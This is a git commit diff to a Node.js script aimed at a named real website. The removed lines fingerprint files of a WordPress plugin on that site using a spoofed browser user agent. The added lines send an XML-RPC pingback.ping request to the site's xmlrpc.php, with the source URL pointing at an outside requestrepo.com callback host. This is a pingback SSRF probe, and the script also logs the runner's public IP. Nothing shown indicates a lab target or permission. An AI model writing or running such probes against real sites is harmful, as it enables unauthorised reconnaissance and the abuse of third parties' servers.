83f2ad63f47ec5bb0578dad2bcf4c9e2abce0387
alice-sippert <alice-sippert@users.noreply.github.com>
2026-09-11 21:12:52 -0300

    Test XML-RPC pingback source fetch

--- dist/index.js
+++ dist/index.js
@@ -1,16 +1,9 @@
-import crypto from 'node:crypto';
 const UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
-const paths=[
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/img/placeholder.png',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/css/exad-styles.min.css',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/js/exad-scripts.min.js',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/js/template-library.min.js',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/js/unlimited-nested-section.min.js',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/css/template-library.min.css',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/fonts/feather-icon/exclusive-icons.js',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/fonts/remix-icon/remix-icon.js',
-'/wp-content/plugins/exclusive-addons-for-elementor/assets/fonts/teeny-icon/teeny-icon.js',
-'/wp-content/plugins/exclusive-addons-for-elementor/readme.txt',
-];
-console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()).catch(e=>'ERR:'+e));
-for(const path of paths){try{const r=await fetch('https://www.riseup.co.il'+path,{redirect:'manual',headers:{'user-agent':UA,'accept':'*/*'}});const b=Buffer.from(await r.arrayBuffer());console.log('ASSET',JSON.stringify({path,status:r.status,len:b.length,sha256:crypto.createHash('sha256').update(b).digest('hex'),lm:r.headers.get('last-modified'),etag:r.headers.get('etag'),ct:r.headers.get('content-type'),head:b.toString('utf8',0,Math.min(500,b.length))}));}catch(e){console.log('ERR',path,String(e))}}
+const xml=`<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://7xqvfwha.requestrepo.com/ping-source</string></value></param><param><value><string>https://www.riseup.co.il/vouchers/</string></value></param></params></methodCall>`;
+console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()));
+for (const host of ['www.riseup.co.il','riseup.co.il']) {
+ try {
+  const r=await fetch(`https://${host}/xmlrpc.php`,{method:'POST',redirect:'manual',headers:{'user-agent':UA,'accept':'*/*','content-type':'text/xml'},body:xml});
+  const b=await r.text(); console.log('XMLRPC',host,JSON.stringify({status:r.status,headers:Object.fromEntries(r.headers),body:b.slice(0,4000)}));
+ } catch(e){console.log('ERR',host,String(e))}
+}
